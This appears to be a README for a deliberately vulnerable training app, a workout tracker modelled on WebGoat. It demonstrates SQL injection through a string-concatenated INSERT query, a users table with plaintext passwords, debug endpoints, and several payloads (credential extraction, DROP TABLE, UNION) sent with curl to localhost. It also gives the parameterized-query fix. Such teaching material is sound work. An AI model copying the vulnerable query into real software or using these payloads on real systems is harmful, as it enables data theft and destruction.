# SQL Injection Demo - SecureStrength Workout Tracker

## 🔓 Educational Security Vulnerability Implementation

This implementation adds a vulnerable SQL injection endpoint to demonstrate common web application security flaws, based on WebGoat lessons 5a/5b pattern.

## ⚠️ WARNING
**FOR EDUCATIONAL PURPOSES ONLY** - This code contains intentional security vulnerabilities and should NEVER be used in production environments.

## Setup and Usage

### 1. Install Dependencies
```bash
npm install
```

### 2. Start Both Backend and Frontend
```bash
npm run dev:full
```

This runs:
- Backend API server on `http://localhost:3001` (vulnerable SQL injection endpoint)
- Frontend React app on `http://localhost:5000`

### 3. Test SQL Injection

1. **Navigate to workout app**: Open `http://localhost:5000`
2. **Start any workout**: Click "Workout A" or "Workout B"
3. **Go to "Log Sets" tab**: Click the middle tab
4. **Open SQL Demo**: Click "Log to Database (SQL Demo)" button
5. **Try payloads**: Click "Security Demo" to see example SQL injection payloads
6. **Execute injection**: Click any "Try #X" button, then "Log Progress to Database"
7. **View results**: Check "Progress" tab → "Show Database Entries"

### 4. SQL Injection Examples

#### Basic Injection (data extraction):
```sql
'); SELECT username, password FROM users; --
```

#### Table Destruction:
```sql
'; DROP TABLE workout_progress; --
```

#### UNION Attack:
```sql
' UNION SELECT id, username, password, email FROM users; --
```

## Vulnerability Details

### CWE-89: SQL Injection
**Location**: `server.cjs` line ~45
**Pattern**: Direct string concatenation in SQL query construction

```javascript
// VULNERABLE CODE (DO NOT USE IN PRODUCTION)
const query = `INSERT INTO workout_progress (user_id, workout_id, exercise_name, reps, weight, notes) VALUES (${userId}, '${workoutId}', '${exerciseName}', ${reps}, ${weight}, '${notes}')`;
```

### Expected Security Scan Results
- **Tool**: GitHub Advanced Security / CodeQL
- **Rule**: CWE-89 SQL Injection detection
- **Severity**: High
- **Location**: Direct string concatenation in database queries

## Database Schema

### `users` table (target for injection):
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password TEXT,  -- ⚠️ Plaintext passwords for demo
    email TEXT
);
```

### `workout_progress` table:
```sql
CREATE TABLE workout_progress (
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    workout_id TEXT,
    exercise_name TEXT,
    reps INTEGER,
    weight REAL,
    notes TEXT,  -- ⚠️ Vulnerable injection point
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

## API Endpoints

### Vulnerable Endpoints
- `POST /api/progress/log` - SQL injection vulnerability
- `GET /api/progress/history` - View logged progress
- `GET /api/debug/users` - View user table (for demo)
- `GET /api/debug/progress` - View all progress entries

### Testing Commands
```bash
# Test normal logging
curl -X POST http://localhost:3001/api/progress/log \
  -H "Content-Type: application/json" \
  -d '{"workoutId": "day-a", "exerciseName": "Squat", "reps": 5, "weight": 135, "notes": "Normal workout"}'

# Test SQL injection
curl -X POST http://localhost:3001/api/progress/log \
  -H "Content-Type: application/json" \
  -d '{"workoutId": "day-a", "exerciseName": "Squat", "reps": 5, "weight": 135, "notes": "'\'''); SELECT username, password FROM users; --"}'
```

## Educational Value

This implementation demonstrates:
1. **Common SQL injection patterns** found in real applications
2. **Impact assessment** - data exposure, data manipulation, system compromise
3. **Detection methods** - static analysis, dynamic testing
4. **Remediation strategies** - parameterized queries, input validation

## Secure Alternatives

**DO USE** (parameterized queries):
```javascript
const query = 'INSERT INTO workout_progress (user_id, workout_id, exercise_name, reps, weight, notes) VALUES (?, ?, ?, ?, ?, ?)';
db.run(query, [userId, workoutId, exerciseName, reps, weight, notes], callback);
```

## References
- [OWASP SQL Injection Prevention](https://owasp.org/www-community/attacks/SQL_Injection)
- [WebGoat SQL Injection Lessons](https://github.com/WebGoat/WebGoat)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)